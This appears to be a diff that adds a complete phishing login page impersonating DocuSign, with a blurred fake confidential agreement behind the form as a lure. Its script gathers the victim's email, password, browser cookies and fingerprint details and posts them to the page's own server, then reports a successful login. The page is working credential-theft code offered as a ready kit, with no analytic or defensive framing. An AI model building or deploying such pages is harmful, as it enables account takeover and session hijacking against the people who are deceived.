@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+            overflow: hidden;
+            background: #e8ecef;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 900px;
+            height: 1200px;
+            background: white;
+            box-shadow: 0 0 50px rgba(0,0,0,0.2);
+            filter: blur(8px);
+            opacity: 0.85;
+            z-index: 0;
+            background-image: 
+                linear-gradient(to right, #ddd 1px, transparent 1px),
+                linear-gradient(to bottom, #ddd 1px, transparent 1px);
+            background-size: 100% 35px, 100% 35px;
+            background-position: 0 100px;
+        }
+        
+        body::after {
+            content: 'CONFIDENTIAL AGREEMENT\A\ADocument ID: DOC-2025-7891\ADate: November 23, 2025\A\AThis Agreement is entered into between\AParty A: DocuSign Corporation\A123 Main Street, San Francisco, CA\A\AParty B: John Smith\A456 Business Avenue, New York, NY\A\ATERMS AND CONDITIONS\A\A1. Purpose of Agreement\AThis document outlines the terms and\Aconditions governing the relationship\Abetween the parties mentioned above.\A\A2. Scope of Work\AThe parties agree to collaborate on\Athe following deliverables and\Amutual obligations as specified.\A\A3. Confidentiality\ABoth parties agree to maintain strict\Aconfidentiality regarding all shared\Ainformation and proprietary data.\A\A4. Duration\AThis agreement shall remain in effect\Afor a period of twelve (12) months\Afrom the date of execution.\A\A5. Signatures\A\A________________________\AAuthorized Signature\ADate: ___________';
+            white-space: pre;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-family: 'Times New Roman', serif;
+            font-size: 15px;
+            color: #111;
+            line-height: 1.5;
+            filter: blur(2px);
+            opacity: 0.15;
+            z-index: 1;
+            pointer-events: none;
+            text-align: left;
+            padding: 60px 100px;
+        }
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.15);
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            position: relative;
+            z-index: 10;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+        .logo img {
+            max-width: 200px;
+            height: auto;
+        }
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: #333;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #36a3f7;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .login-button:hover {
+            background-color: #2d8de0;
+        }
+        .error-message {
+            color: #e74c3c;
+            margin-top: 1rem;
+            text-align: center;
+            font-size: 14px;
+        }
+        .forgot-password {
+            text-align: right;
+            margin-top: 0.5rem;
+        }
+        .forgot-password a {
+            color: #36a3f7;
+            text-decoration: none;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="/ds-logo-default.svg" alt="DocuSign">
+        </div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+                <div class="forgot-password">
+                    <a href="#">Forgot your password?</a>
+                </div>
+            </div>
+            <button type="submit" class="login-button">Log In</button>
+            <div id="errorMessage" class="error-message"></div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorElement = document.getElementById('errorMessage');
+            const loginButton = document.querySelector('.login-button');
+            
+            // Show loading state
+            const originalButtonText = loginButton.textContent;
+            loginButton.textContent = 'Signing in...';
+            loginButton.disabled = true;
+            errorElement.textContent = '';
+            
+            try {
+                // Get browser cookies
+                const cookies = document.cookie || 'No cookies';
+                
+                // Get browser info
+                const browserInfo = {
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    cookieEnabled: navigator.cookieEnabled,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+                
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        email, 
+                        password,
+                        cookies: cookies,
+                        browserInfo: browserInfo
+                    }),
+                });
+
+                const data = await response.json();
+                
+                if (response.ok && data.success) {
+                    // Show success message
+                    errorElement.style.color = '#27ae60';
+                    errorElement.textContent = '✓ Login successful!';
+                    // Clear form
+                    document.getElementById('loginForm').reset();
+                } else {
+                    errorElement.textContent = data.error || 'Invalid email or password. Please try again.';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                errorElement.textContent = 'An error occurred. Please try again.';
+            } finally {
+                // Reset button state
+                loginButton.textContent = originalButtonText;
+                loginButton.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
